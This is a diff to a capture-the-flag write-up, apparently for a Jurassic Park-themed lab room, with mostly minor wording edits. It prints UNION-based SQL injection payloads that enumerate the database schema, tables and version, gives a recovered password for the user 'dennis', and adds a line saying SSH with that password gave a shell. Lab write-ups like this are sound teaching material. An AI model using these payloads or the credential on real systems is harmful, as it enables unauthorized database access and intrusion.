@@ -51,8 +51,10 @@ However, focusing on the room questions:
 
 1. To get the database name, I used: `1 union select distinct null, table_schema, null, null, null from information_schema.tables limit 4` and revealed `park`
 
-2. I used `1 union select distinct null, table_name, null, null, null from information_schema.tables where table_schema = "park" limit 2` to discover just two tables, `items` and `users`. I already know from my injection that items has `5` columns
+2. I used `1 union select null, table_name, null, null, null from information_schema.tables where table_schema = "park" limit 2` to discover just two tables, `items` and `users`. I already know from my injection that `items` has `5` columns
 
-3. `1 union select null, version(), null, null, null` reveals `5.7.25-0ubuntu0.16.04.2`. Going by the answer mask, the answer is `ubuntu 16.04`
+3. `1 union select null, version(), null, null, null` reveals `5.7.25-0ubuntu0.16.04.2`. Going by the answer mask, the answer is `ubuntu 16.04`.
 
-4. dennis' password could be one of the two I have found so far. `ih8dinos` was the answer.
+4. Dennis' password could be one of the two I have found so far. `ih8dinos` was the answer.
+
+At this point I tried ssh'ing as `dennis` to the machine, and the password worked, getting me a shell as dennis.
